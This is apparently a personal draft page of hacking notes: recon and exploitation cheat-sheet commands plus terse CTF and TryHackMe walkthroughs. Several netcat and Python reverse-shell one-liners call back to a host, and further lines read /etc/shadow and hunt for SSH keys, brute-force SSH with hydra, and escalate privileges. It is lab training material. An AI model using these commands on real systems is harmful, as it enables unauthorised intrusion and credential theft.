---
title: "Hack Notes"
published: 2023-12-15T15:47:45+10:00
lastUpdated: 2023-12-15T15:47:45+10:00
url: hacknotes
alias: # aliases for multiple
    - 
    - 

cover:
    image: "https://images.unsplash.com/photo-1519575706483-221027bfbb31?q=80&w=1080&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
    # alt: "<alt text>"
    caption: Photo by <a href="https://unsplash.com/@sebastiaanstam?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">sebastiaan stam</a> on <a href="https://unsplash.com/photos/man-wearing-red-hoodie-RChZT-JlI9g?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Unsplash</a>
    relative: false # To use relative path for cover image, used in hugo Page-bundles 

type: page # Options: post, letter, note, page
categories: Project # Options: Writeup, Personal
tags:
    - hacking
    - 

draft: true

# ShowToc: false
# TocOpen: false

# searchHidden: true # Make false to hide page from search
---

> 🚩 A collection of notes, commands, & links to help w/ hacking & cybersec. Work in progress, please be patient while it’s updated.

<!-- - `rustscan -a $ipa -p $ports -- -sC -sV`

Fuzzing

- `rustscan -a $ipa` -->


---

[CyberChef](https://gchq.github.io/CyberChef/) // [GTFOBins](https://gtfobins.github.io/) // [HackTricks](https://book.hacktricks.xyz/) // [RevShells](https://www.revshells.com/) // [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## 🔥 Kill Chain

**General**

- `CTRL + SHIFT + UP|DOWN` # scroll
- `CTRL + SHIFT C|V` # Copy|Paste

- `nl` # cat w/ line nums
- `sed` # stream editor

- `ip=` # set alias env var
- `echo $ip` # test alias

---

### Recon/Enumeration

rustscan

- `rustscan -a $ip -g`
- `rustscan -a $ip -p $ports -- -sC -sV | tee scan.init`

nmap 

- `nmap -vv -Pn $ip`
- `nmap -vv -Pn -p $ports -A $ip`

feroxbuster

- `feroxbuster -u http://$ipa -w $wordlist | tee fuzz.init`

FFUF

- `ffuf -u http://$ip/FUZZ -w $wordlist | tee fuzz.init`

firefox

- Analysis: Whatruns, Wappalyzer
- `/robots.txt`, `sitemap(.xml)`

smb

- `enum4linux $ipa | tee enum4.txt` # smb shares

---

### Exploitation

- searchsploit [^](https://www.exploit-db.com/searchsploit)
    - `searchsploit -m $number $location` # Copy
    - `searchsploit -w $term` # Website

Shells - Reverse

nc (netcat)

- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f`
- `nc -e /bin/bash $ip $port`

### Linux Enumeration

- `ls -la /home`
- `cat /etc/passwd`
- `cat /etc/crontab`
- `sudo -l` # run sudo with?
- `find / —perm 4000 2>/dev/null` # find suids
- `find / -user $user 2>/dev/null` # find user files
- `find / -name *id_rsa* 2>/dev/null` # find files that match id_rsa

**Full TTY | Spawn Shells [^](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys) [^](https://hideandsec.sh/books/cheatsheets-82c/page/spawning-tty-shells)**

```bash
python -c "import pty; pty.spawn('/bin/bash')"
python3 -c "import pty; pty.spawn('/bin/bash')"

/bin/sh -i

[CTRL+Z]
stty raw -ech;fg
export TERM=xterm
```

- pspy [🔗](https://github.com/DominicBreuker/pspy)

**Forensics**

- strings
- exiftool
- binwalk
- pdfinfo

**Hashes**

- hashid
- namethathhash (nth)

- Git
    - `git add . && git commit -m “$comment” && git push`
    - Generate [token](https://github.com/settings/tokens?type=beta), use as password.
- Repos
    
    https://github.com/overgrowncarrot1/Scripts
    

**Windows**

cmd.exe

- `dir` # list contents
- `cd` # change dir
- `type` # cat file contents
- `type $file | clip` # copy to clipboard

## 📝 Notes

---

- [🐀](https://www.udemy.com/course/broad-scope-bug-bounties-from-scratch/) Broad Scope Bug Bounties From Scratch - XSS Rat
    
    Bug bounty != Pentesting, it’s testing targets with skillset.
    
    Platforms: public(Intigriti, HackerOne, Bugcrowd), private.
    
    Target: **B2B**|B2C, Wide Scope|Main App, **Web**|Mobile|Desktop|IP|IOT, VDP|Paid, Public|**Private**.
    
    - Avoid: high payout|banks (hardened), newspapers (paywall), mobile|webshops, no creds.
    
    Invites: be active, report, ctfs (lower qual).
    
    Subdomains: `httprobe` [^](https://github.com/tomnomnom/httprobe) finds working http(s).
    
    - Flyover: Aquatone,

---

Computing Fundamentals - Roppers Academy

---

Computer Science 50 Python (CS50P)

---

Automate The Boring Stuff with Python

---

## ✍ Writeups

---

[👳‍♂️ Aman CTF](https://ctf.eoman.com/)

- Getting started: inspect > comment
- Attack on EU: [doc](https://cbo.gov.om/sites/assets/Documents/English/Circulars/2015/BM1136.pdf) > “Types of Internet Banking Attacks”
- Pharming: search [^](https://www.proofpoint.com/us/threat-reference/pharming) [^](https://www.keyfactor.com/blog/what-is-dns-poisoning-and-dns-spoofing/) [^](https://www.techrepublic.com/article/hosts-file-pharming-and-other-botnet-recruiting-methods/)
- Phising hacker: search [^](https://www.amazon.com/Art-Deception-Controlling-Element-Security-ebook/dp/B006BBZHAK)
- Securing External Link: search [^](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
- Linux folder: search [^](https://www.cbtnuggets.com/blog/technology/system-admin/a-complete-guide-to-linux-config-files)

---

[💻](https://ctf.hacker101.com/) **************************Hacker101**************************

- A little something to get you started
    - Browser > inspect > `/background.png`
- Micro-CMS v1
- Postbook
    
    Flag0
    
    - user:password
    
    Flag1
    
    - My profile > `?page=profile.php&id=d` # change d to b or c
    
    Flag2
    
    - new post > inspect > form
    - `<input type="hidden" name="user_id" value="$ANYTHING">`
    
    Flag3
    
    - 189 * 5 = 945
    - post > change `&id=945`
    
    Flag4
    
    - `page=view.php&id=945` > `page=edit.php&id=945`
    
    Flag5
    
    - Browser > inspect > application > cookie id:$string
    - `nth $string` = md5
    - `echo $string > $file`
    - `john --format=Raw-MD5 --wordlist=rockyou.txt $file`
    - `echo -n '1' | md5sum`
    - Browser > inspect > application > cookie id:$md5hash
    
    Flag6
    
    - Login > user:password
    - `echo -n '1' | md5sum`
    - `?delete=$md5hash`
- Petshop Pro
    
    Flag0
    
    - Burp > /checkout > Repeater > Inspector “Request Body Paramaters”
    - Change price of image to $0.00
    
    Flag1 - NOT WORKING
    
    - hydra -L $xato-net-10-million-usernames -p password $domain|ip http-post-form "/login/:username=^USER^&password=^PASS^:Invalid username" -o pass.txt -v

---

🗃 **Kase Scenarios**

- 🐍 Betrayal
    
    People
    
    - Rhett Blackwood: [FB](https://www.facebook.com/profile.php?id=100090541127618), [FB G](https://www.facebook.com/groups/237143225575567), [YT](https://www.youtube.com/@MuscleMan69/featured)
    
    Scene of the Crime
    
    - Alarm System: Toward Kitchen P*********n O**
    - Computers: Office x3
    - Password: [^](https://www.amazon.com/Journey-Violence-violent-schemer-another-ebook/dp/B014SY9CIO) [^](https://en.wikipedia.org/wiki/The_Adventure_of_the_Speckled_Band) [^](https://www.litcharts.com/lit/the-adventure-of-the-speckled-band/symbols/swamp-adder) - s****a***r
    - Stairs: ruler > top > bottom 1*
    
    Late Night Escape Challenges
    
    - Google Lens > [^](https://www.peakpx.com/en/hd-wallpaper-desktop-koidm) > C******* C*******
    - Guess > F*******
    - Profile > [^](https://www.facebook.com/photo?fbid=173176402377063&set=a.173176835710353) > URL:1*3*7*4*2*7*0*3
    - `wget $jpg` > `exiftool $jpg` > Date/Time Original > 2*:1*
    - Life Insurance: `wget $zip` > `open $pdf` > $*,000,000.00
    - C****e and R***t
    
    Online Troll
    
    - YouTube > Facebook > R****
- [🌊](https://courses.kasescenarios.com/courses/dark-waters) Dark Waters | Writeup [Part 1](https://youtu.be/EBcGjmrubKY), [Part 2](https://youtu.be/OdvvMXcPFVw)
    
    People
    
    - P - author of letter, hand written, “test the water”
    - Lisa - young, bar owner, offered room. some event.
    - Protestor - biology student @Penn State York, was watched/harrased, claims GRPC,
        - William Heathcote - great-gf 1837 had issues w/ GRPC.
    - [GRPC](https://www.kaseportal.com/grpc) - local paper co, holding event, 4 employees (*P*atti), hosting 100th ann,
    - Alexander Ross - politiain, linked to GRPC.
    
    Location
    
    - Glen Rock, Pennsylvania
    
    Unknown Email: rockthesocks1982@fastmail.com
    
    r/g****************e [^](https://www.reddit.com/r/glenrockresistance/)
    
    - Incoming cache drop S**********r [^](https://i.imgur.com/bqdrp1P.png) [^](https://www.dcode.fr/webdings-font) [^](https://www.thespreadsheetguru.com/blog/wingdings-webdings-font-icon-cheat-sheet-printable)
    
    Arkg sylbire: Ynxr Zneohet (ROT13)
    
    - Next flyover: L**e M*****g
    
    ---
    

---

🚩 ********************n00bzctf 2023 | [YouTube Writeup](https://youtu.be/3LKAhVN2Wm8)**

- Forensics
    
    Crack & Crack: 
    
    - `zip2john $zip > $hash`, `john $rockyou $hash` [^](https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux)
    - `pdf2john $pdf > $hash`, `john $rockyou $hash` [^](https://askubuntu.com/questions/43264/how-to-open-a-pdf-file-from-terminal) [^](https://ourcodeworld.com/articles/read/939/how-to-crack-a-pdf-password-with-brute-force-using-john-the-ripper-in-kali-linux)
    
    Avengers [^](https://marvelcinematicuniverse.fandom.com/wiki/Tesseract)
    
    - Research ffmpeg + tesseract [^](https://medium.com/@mukeshkumar_46704/using-ffmpeg-on-video-subtitle-and-text-extraction-31fc952799d8) [^](https://www.reddit.com/r/ffmpeg/comments/nvlxd2/extract_text_from_video/) [^](https://ffmpeg.org/ffmpeg-all.html#toc-ocr)
    - `sudo apt install ffmpeg tesseract-ocr tesseract-ocr-eng`
    - `ffmpeg -i flag.avi -vf fps=1 frames/frame_%04d.jpg`
    - `for image_file in frames/*.jpg; do tesseract "$image_file" "output/$(basename "${image_file%.*}")"; done`
    - `cat output/* > all.text`, copied > CyberChef [^](https://gchq.github.io/CyberChef/#recipe=From_Binary('CRLF',8)&input=MDExMDExMTANCjAwMTEwMDAwDQowMDExMDAwMA0KMDExMDAwMTANCjAxMTExMDEwDQowMTExMTAxMQ0KMDAxMTAxMTENCjAxMTAxMDAwDQowMDExMDAwMQ0KMDExMTAwMTENCjAxMDExMTExDQowMDExMDAwMQ0KMDExMTAwMTENCjAxMDExMTExDQowMDExMDEwMA0KMDEwMTExMTENCjAxMTEwMTEwDQowMDExMDAxMQ0KMDExMTAwMTANCjAxMTExMDAxDQowMTAxMTExMQ0KMDExMDExMDANCjAwMTEwMDAwDQowMTEwMTExMA0KMDExMDAxMTENCjAxMDExMTExDQowMTEwMDExMA0KMDExMDExMDANCjAwMTEwMTAwDQowMTEwMDExMQ0KMDEwMTExMTENCjAxMTEwMDExDQowMDExMDAwMA0KMDEwMTExMTENCjAxMTEwMTAwDQowMTEwMTAwMA0KMDAxMTAxMDANCjAxMTEwMTAwDQowMTAxMTExMQ0KMDExMTEwMDENCjAwMTEwMDAwDQowMTExMDEwMQ0KMDEwMTExMTENCjAxMTAwMDExDQowMDExMDEwMA0KMDExMDExMTANCjAxMTAxMTEwDQowMDExMDAwMA0KMDExMTAxMDANCjAxMDExMTExDQowMTExMDAxMQ0KMDAxMTAwMDANCjAxMTAxMTAwDQowMTExMDExMA0KMDAxMTAwMTENCjAxMDExMTExDQowMDExMDExMQ0KMDExMDEwMDANCjAwMTEwMDExDQowMTAxMTExMQ0KMDExMDAwMTENCjAxMTAxMDAwDQowMDExMDEwMA0KMDExMDExMDANCjAxMTAxMTAwDQowMDExMDAxMQ0KMDExMDExMTANCjAxMTAwMTExDQowMDExMDAxMQ0KMDEwMTExMTENCjAxMTAxMTAxDQowMDExMDEwMA0KMDExMDExMTANCjAxMTEwMTAxDQowMDExMDEwMA0KMDExMDExMDANCjAxMTAxMTAwDQowMTExMTAwMQ0KMDEwMTExMTENCjAxMTAwMDEwDQowMDExMDExMQ0KMDExMTAxMTENCjAxMDExMTExDQowMDExMDExMQ0KMDAxMTAwMTENCjAxMTEwMDExDQowMDExMDAxMQ0KMDExMTAwMTANCjAwMTEwMTAwDQowMTEwMDAxMQ0KMDAxMTAxMTENCjAxMDExMTExDQowMDExMDAwMQ0KMDExMTAwMTENCjAxMDExMTExDQowMDExMDEwMA0KMDEwMTExMTENCjAxMTEwMTEwDQowMDExMDAxMQ0KMDExMTAwMTANCjAxMTExMDAxDQowMTAxMTExMQ0KMDExMDAxMTENCjAwMTEwMDAwDQowMDExMDAwMA0KMDExMDAxMDANCjAxMDExMTExDQowMTExMDEwMA0KMDAxMTAwMDANCjAwMTEwMDAwDQowMTEwMTEwMA0KMDAxMDAwMDENCjAxMTExMTAxDQo)
- Misc
    
    Sanity: /rules > inspect > `<!-- ****** -->`
    
    ASL: [this](https://www.researchgate.net/figure/The-26-letters-and-10-digits-of-American-Sign-Language-ASL_fig1_328396430) + notepad
    
    Google Form 1: inspect > `CTRL + F` “n00bz”
    
    My Chemical Romance: [this](https://en.wikipedia.org/wiki/Group_%28periodic_table%29#/media/File:Simple_Periodic_Table_Chart-blocks.svg) > 186808155710 > 18 68 08 15 57 10 > Ar Er O P La Ne > {aeroplane}
    
- OSINT
    
    Mission Moon
    
    - Reverse Image Search [^](https://tineye.com/search/e36e2b2e21679858d28e07b4cf5fffe698594238?sort=score&order=desc&page=1) > India's Vikram [^](https://www.planetary.org/articles/vikram-apparently-crash-lands) > Chandrayaan 2 Coords [^](https://blog.jatan.space/p/chandrayaan-2-landing-site-in-the-southern-highlands)
    
    Damn: Rev Img [^](https://tineye.com/search/72d3c15bd6ff22fdf9b943893c4f819a9ef6c77d?sort=score&order=desc&page=1) > CNN [^](https://edition.cnn.com/2023/06/07/europe/ukraine-nova-kakhovka-dam-environment-damage-intl-hnk/index.html) > GMaps [^](https://www.google.com/maps/place/Nova+Kakhovka,+Kherson+Oblast,+Ukraine,+74900/@46.7506358,33.3223225,14z/data=!3m1!4b1!4m6!3m5!1s0x40c38ffaf953e55b:0xe7dd49fae35d59f8!8m2!3d46.7515251!4d33.3678207!16zL20vMDM1eGgz?entry=ttu) 
    
- Pwn
    
    Flag Shop: 2 > 1124151235124512 (large number)
    
- Rev
    - welcome `strings $file`
- Web
    
    Club_N00b: $site > `/check?secret_phrase=radical`
    
    Robots: $site > `/robots.txt`
    
    Secret Group: Burp Repeater > change headers user-agent, connection etc.
    
    Conditions: Burp Repeater > username=ᾉᾉᾉᾉᾉᾉᾉᾉᾉᾉᾉᾉᾉ [^](https://stackoverflow.com/questions/57190507/strange-behavior-of-pythons-upper-method)
    

---

**🎓 PicoCTF**

- Cryptography
    
    Mod 26: CyberChef (ROT13)
    
    Mind your Ps and Qs: rsactftool [^](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
    
- Forensics
    
    information: exiftool $file, CyberChef (From Base64)
    
    Matryoshka doll: binwalk $file, unzip cd x4, cat $file
    
    Glory of the Garden: xxd $file *see end
    
    Enhance!: subl $file *manually extracted
    
- General Skills
    
    runme.py: python $file
    
    Serpentine: move print_flag(), python $file
    
    First Find: wget $link, unzip $file, cat $pathToFile
    
    Big Zip: grep -r pico $dir
    
    Based: CyberChef
    
    plumbing: nc $domain $port > file, cat file | grep pico
    
    mus1c: [rockstar](https://codewithrockstar.com/online), CyberChef (From Decimal)
    
    flag_shop: 2,1,3578290,2,2,1
    
    1_wanna_b3_a_r0ck5tar: remove lines
    
- Web
    
    GET aHEAD: Burp > Repeater, HEAD [^](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD) 
    
    Cookie: 
    
    - Burp > Repeater > name=18
    - Inspect > Storage > Value 1,2,3,4,etc
    
    Insp3ct0r: Inspect HTML, CSS & JS files for comments.
    
    Scavenger Hunt: Insp3ct0r but `robots.txt`, `.htaccess`, & `.DS_Store`.
    
    **More Cookies**
    
    - Base64 cookie
    
    **where are the robots**: /robots.txt
    
    **logon**: Burp > proxy random login
    
    - Cookie: username=Joe; admin=True; password=
    
    **dont-use-client-side**: view source > js
    
    It is my Birthday: 
    
    **Who are you?:** Burp > Repeater > Add Headers
    
    - Referer: $URL [^](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)
    - Date: 2018 [^](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Date)
    - DNT: 1 [^](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/DNT)
    - X-Forwarded-For: 103.81.143.0 [^](https://lite.ip2location.com/sweden-ip-address-ranges?lang=en_US) [^](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
    - Accept-Language: sv-SE [^](http://www.lingoes.net/en/translator/langcode.htm)
    
    login: view-source > /index.js (CyberChef Base64)
    

---

**☁ TryHackMe | [Free $5 Credit](https://go.mrash.co/tryhackme)**

- [🔐](https://tryhackme.com/room/bsidesgtanonforce?referrer=5fb398581c090b7c78567a5a) Anonforce
    
    ---
    
    Writeup: [YouTube](https://youtu.be/viY-a3B1ItQ) // Blog
    
    ---
    
    rustscan -a $ip, 21:ftp 22:ssh
    
    ftp $ip, anonymous
    
    user = m*******
    
    get user.txt
    
    - cat ~/user.txt
    
    get /notread/*
    
    - `gpg2john private.asc > private.hash`
    - `john --wordlist=/rockyou.txt private.hash`
    - x******
    
    `gpg` [🔗](https://www.reddit.com/r/GnuPG/comments/mibwbv/i_have_an_elg_private_key_how_do_i_use_it_to/) [🔗](https://en.wikipedia.org/wiki/Pretty_Good_Privacy) 
    
    - `gpg -d backup.pgp`
    
    nano root.hash
    
    - `hashcat root.hash rockyou.txt`
    - h*****
    
    `ssh root@$ip`
    
    ---
    
- [🏘](https://tryhackme.com/room/attacktivedirectory?referrer=5fb398581c090b7c78567a5a) Attacktive Directory (AttacktiveDirect)
    
    ---
    
    Writeup: YouTube
    
    ---
    
    `kerbrute userenum --dc THM-AD -d spookysec.local userlist.txt`
    
    ---
    
- [🍺](https://tryhackme.com/room/cowboyhacker?referrer=5fb398581c090b7c78567a5a) Bounty Hacker
    
    ---
    
    Writeup: [YouTube](https://youtu.be/RIiRB_tqfVk) // Blog
    
    ---
    
    rustscan -a $ip -p $ports -- -sC -sV
    
    ftp -A $ip [^](https://tryhackme.com/forum/thread/61d36f77eb3bbf056a906e3f)
    
    hydra -l $user -P l****.txt $ip ssh
    
    sudo -l, tar [^](https://gtfobins.github.io/gtfobins/tar/)
    
    ---
    
- [🦉](https://tryhackme.com/room/c4ptur3th3fl4g?referrer=5fb398581c090b7c78567a5a) c4ptur3th3fl4g (capturetheflag)
    
    ---
    
    Writeup: [YouTube](https://youtu.be/GMZ_QhspA6k) // Blog
    
    ---
    
    - leet
    - binary
    - base32
    - base64
    - hex
    - ROT13
    - ROT47
    - morse
    - decimal
    - base64 > morse > binary > ROT47 > decimal
    - Audacity > [spectrogram view](https://manual.audacityteam.org/man/spectrogram_view.html)
    - steghide --extract -sf <file>
    - strings <file>
    
    ---
    
- [❄](https://tryhackme.com/room/colddboxeasy) Coldbox Easy
    
    ```bash
    80:http,4512:ssh
    
    http
    	- wordpress
    	- ffuf:/******/
    	- users:****,****,*****
    
    	msfconsole -q
    		- setg RHOSTS
    		- use wordpress_ghost_scanner, wordpress_xmlrpc_dos, wordpress_xmlrpc_login, wordpress_pingback_access
    
    	wpscan --url http://$ip -e vp,vt,u
    	wpscan --url http://$ip --passwords $wordlist
    		- *****:*********
    		- Appearance > Editor > PHP Pentest Monkey Rev Shell
    
    # Initial Access www-data
    cat /var/www/html/wp-config.php
    	- DB_NAME: ******, DB_USER:*****, DB_PASSWORD:************
    cat /etc/passwd/ 
    ssh c0ldd@$ip -p 4512
    cat user.txt
    
    # PrivEsc
    sudo -l
    sudo vim, :sh
    ```
    
- [🚪](https://tryhackme.com/room/corridor?referrer=5fb398581c090b7c78567a5a) Corridor
    
    ---
    
    Writeup: [YouTube](https://youtu.be/iH_zf7Vvark) // Blog
    
    ---
    
    rustscan: 80,http
    
    source: map tags w/ hash dirs > hash.txt
    
    hashcat hash.txt /rockyou.txt
    
    echo -n $number | md5sum
    
    firefox: http://$ip/$md5sum
    
    ---
    
- [🔎](https://tryhackme.com/room/contentdiscovery?referrer=5fb398581c090b7c78567a5a) Content Discovery
    
    ---
    
    Content: assets (files, vids, imgs...), features + more.
    
    Discovery (methods): manual, automated and OSINT + combination.
    
    Manual: /robots.txt, `favicon | md5sum` [^](https://wiki.owasp.org/index.php/OWASP_favicon_database), sitemap.xml, headers `curl $ipa -v`, framework stack via comments, (c) notices or credits.
    
    OSINT: [GoogleDork](https://en.wikipedia.org/wiki/Google_hacking)(site, inurl, filetype, intitle), wappalyzer, [wayback](https://archive.org/web/), github, S3 Buckets http(s)://*{name}*.s3.amazonaws.com.
    
    Automated: fuzzing(dirb, gobust, fuff, ferox).
    
- [🛋](https://tryhackme.com/room/couch?referrer=5fb398581c090b7c78567a5a) Couch
    
    ---
    
    Writeup: YouTube (Coming Soon)
    
    ---
    
    `rustscan`
    
    Research [^](https://guide.couchdb.org/draft/tour.html)
    
    `ssh user:password`
    
    - `cat .bash_history`
    - `docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine`
    - `cat /mnt/root/root.txt`
    
    ---
    
- [🚩](https://tryhackme.com/room/ctfcollectionvol1?referrer=5fb398581c090b7c78567a5a) CTF Collection Volume 1 (ctfcollectionvol1)
    
    ---
    
    Writeup: [YouTube](https://youtu.be/hwJaHmoHSZ4) // Blog (Coming Soon)
    
    ---
    
    - CyberChef > base64
    - `strings $file` or `exiftool`
    - `steghide --extract -sf $file`
    - Inspect (CTRL + SHIFT + C)
    - `zbarimg $file` [^](https://tuxthink.blogspot.com/2014/01/qr-code-encode-and-decode-qr-code-on.html)
    - `strings $file`
    - CyberChef > Base58
    - CyberChef > ROT13 > ROT7
    - Inspect (CTRL + SHIFT + C)
    - `xxd -p $file > $newFile`
        - `nano $newFile`, replace 2333445f w/ 89504E47 [^](https://en.wikipedia.org/wiki/PNG)
        - CyberChef > Upload $newFile > From Hex > Render Image
    - Google Dork `site:"reddit.com" intext:"THM" intitle:"tryhackme"`
    - `nano $file`, `beef $file`
    - [XOR Calculator](https://xor.pw/#) > ASCII (base 256)
    - `binwalk $file`, `unzip $file`
    - [stegsolve](https://www.aldeid.com/wiki/Stegsolve)
    - `zbarimg $file`, https://sclouddownloader.net/
    - [Wayback](https://web.archive.org/web/20200102131252/ttps://www.embeddedhacker.com/)
    - [Decode](https://www.dcode.fr/vigenere-cipher) > Automatic > Key = THM
    - [Dec](https://www.rapidtables.com/convert/number/decimal-to-hex.html) > [Hex](https://www.rapidtables.com/convert/number/hex-to-decimal.html) > ASCii
    - wireshark > filter `http.request.method == “GET”` > Follow HTTP Stream
    
    ---
    
- [🕺](https://tryhackme.com/room/bsidesgtdav?referrer=5fb398581c090b7c78567a5a) Dav
    
    ---
    
    Writeups: [Twitter](https://twitter.com/mrashc0/status/1630361263321788417?s=20) // [YouTube](https://youtu.be/UDLqISuGiEY) // Blog (Coming Soon)
    
    ---
    
    rustscan
    
    - 80
    - Apache/2.4.18
    
    feroxbuster
    
    - /webdav
    
    Try: Burpsuite - [bruteforce basic http auth](https://securityonline.info/use-burp-suite-brute-force-http-basic-authentication/)
    
    Search - [webdav default credentials](https://search.brave.com/search?q=webdav+default+credentials&source=web) [^](https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html)
    
    - w*****:x*****
    
    `hashid $hash`
    
    Try: MD5(APR) or Apache MD5 [^](https://hashcat.net/wiki/doku.php?id=example_hashes)
    
    - `hashcat -m 1600 hash.txt $rockyou.txt`
    
    `cadaver <http://$ip/webdav`> [^](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)
    
    - revshell = shell.php
    - `put shell.php`
    - `nc -lnvp $port`
    - `http://$ip/webdav/shell.php`
    
    Upgrade Shell
    
    - `python3 -c "import pty; pty.spawn('/bin/bash')"`
    - `[CTRL+Z]`
    - `stty raw -echo;fg`
    - `export TERM=xterm`
    
    PrivEsc [^](https://www.hackingarticles.in/linux-for-pentester-cat-privilege-escalation/)
    
    - `sudo -l` = `/bin/cat`
    - `cat /etc/shadow`
    - `cat /root/root.txt`
    
    ---
    
- [🥜](https://tryhackme.com/room/easypeasyctf?referrer=5fb398581c090b7c78567a5a) Easy Peasy
    
    ---
    
    Writeup: [YouTube](https://youtu.be/0ahKui2eBjs) // Blog
    
    ---
    
    rustscan: 80:http, 6498:ssh, 65524:http
    
    feroxbuster: 80, /hidden/whatever, view-source:base64
    
    65524:viewsource search “flag”
    
    65524/robots.txt [^](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250), view-source:Base62 = $directory
    
    - hashcat -m 6900 $hash $dict
    - steghide --extract -sf $img, cat $file.txt, binary cyberchef
    - ssh b*****@$ip -p 6498
    
    cat crontab, nano $file > revshell [^](https://www.revshells.com/), cat $.root.txt
    
    ---
    
- [🎮](https://tryhackme.com/room/gamingserver?referrer=5fb398581c090b7c78567a5a) Gaming Server
    
    ---
    
    Writeup: [YouTube](https://youtu.be/ls3eNtzH0Ek) // Blog
    
    ---
    
    rustscan -a $ip, 22:ssh, 80:http
    
    feroxbuster: /u*****s/, /s****t/
    
    user = j***, pw = dict.lst
    
    `ssh2john $key > $hash`, `john $hash dict.lst` l*****n, `chmod 600 $key`
    
    wget [^](https://github.com/saghul/lxd-alpine-builder), chmod +x $file, `python -m http.server 80`
    
    - `bash build-alpine`
    - `mv /mnt/root`
    
    ---
    
- [🔥](https://tryhackme.com/room/ignite) Ignite
    
    ---
    
    Writeup: [YouTube](https://youtu.be/yMVwRcLrVe4) // Blog
    
    ---
    
    rustscan
    
    - `80`
    - a****:a****
    
    `searchsploit Fuel`
    
    - `searchsploit -m 50477`
    - https://www.exploit-db.com/exploits/50477
    - RevShell
        
        `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.1.107 4242 >/tmp/f`
        
    - Upgrade Shell
        - `python3 -c "import pty; pty.spawn('/bin/bash')"`
        - `[CTRL+Z]`
        - `stty raw -echo;fg`
        - `export TERM=xterm`
    - `cat /fuel/application/config/database.php`
    
    `su root`
    
    ---
    
- [🔎](https://tryhackme.com/room/investigatingwindows) Investigating Windows
    
    ---
    
    Writeup: [YouTube](https://youtu.be/wEqNxgWviuk) // Blog
    
    ---
    
    RDP via Remmina
    
    - cmd > `systeminfo`
    - `Get-LocalUser | Select Name,LastLogon`
    - regedit > HKEY_LOCAL_MACHINE > SOFTWARE > Microsoft > Windows > CurrentVersion > Run
    - Computer Management > Groups > Administrator
    - Event Viewer > Event ID 4634 ‘Log off’
        - Alternative: `net user John`
    - C:\TMP
    - C:\Windows\System32\drivers\etc
    - C:\inetpub\wwwroot
    - Firewall > Inbound Rules > 1337
    
    ---
    
- [📚](https://tryhackme.com/room/bsidesgtlibrary) Library
    
    ---
    
    Writeup: [YouTube](https://youtu.be/BBmavcZ9VhE) // Blog
    
    ---
    
    rustscan: 22,80=Apache2.4.18
    
    robots.txt
    
    - rockyou [^](https://www.codeweavers.com/support/wiki/linux/linuxtutorial/changeua) [^](https://www.whatismybrowser.com/detect/what-is-my-user-agent/) [^](https://github.com/sheimo/User-Agent-Bruter)
    
    Users - m*******
    
    hydra SSH bruteforce [^](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/)
    
    - `hydra -l m******* -P $rockyou $ip ssh -t 4 -vv`
    - i********
    
    `rm bak.py`
    
    `nano bak.up`
    
    - `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")`
    
    ---
    
- [🏹](https://tryhackme.com/room/lianyu) Lian Yu
    
    ---
    
    Writeup: [YouTube](https://youtu.be/2iglguKqvuw) // Blog
    
    ---
    
    rustscan: ftp, ssh, http
    
    feroxbuster x3 big.txt dir-medium.txt
    
    - /island/2100/green_arrow.ticket
    - B***58
    
    ftp > mget *
    
    - hexedit $broken.png, fix magic header [^](https://en.wikipedia.org/wiki/List_of_file_signatures)
    - stegseek $jpg
    
    ssh $s***e $shado
    
    - sudo -l [^](https://linux.die.net/man/1/pkexec)
    - sudo pkexec /bin/sh
    
    ---
    
- [🎩](https://tryhackme.com/room/madness) Madness
    
    ---
    
    Writeup: [YouTube](https://youtu.be/qrnC71SDD8A) // Blog
    
    ---
    
    rustscan: 22,80
    
    http: view source
    
    - wget $jpg
    
    hexedit $jpg, magic number [^](https://en.wikipedia.org/wiki/List_of_file_signatures)
    
    - http://$ip/$directory?$variable=$number
    
    Burp: intruder, payload 0-99
    
    steghide —extract -sf $image
    
    find / -perm -4000 2>dev/null
    
    - screen 4.05.00 [^](https://gtfobins.github.io/gtfobins/screen/), exploit db [^](https://www.exploit-db.com/exploits/41154)
    
    ---
    
- [📃](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa28yZ3Q3X3J0X2tMemQ4aWNEYTd1Zm1NRk0xQXxBQ3Jtc0trMV9xRGNzSmRDdzhYcmQzaUsxSzFFZC1ITkppQUh0VVJrWEE0aHl0SDFleko0WUJXSUMwWmJCWUl0bUNpRmJkR2RUcTVXaEw3NWRZN19ZNEU3U0dPVlpXV050ZTVCQUhKbzQtbDFocmMzblN1bllwMA&q=https%3A%2F%2Ftryhackme.com%2Froom%2Fmd2pdf&v=8QUxfBVjNeo) MD2PDF
    
    ---
    
    Writeup: [YouTube](https://youtu.be/8QUxfBVjNeo) // Blog
    
    ---
    
    rustscan: 5000
    
    gobuster -w /seclists/common.txt = /admin
    
    <iframe src="http://localhost:5000/admin"></iframe>
    
    ---
    
- 🎭 Mr Robot (WIP)
    
    ---
    
    Writeup: YouTube // Blog
    
    ---
    
    - rustscan: 80, 443
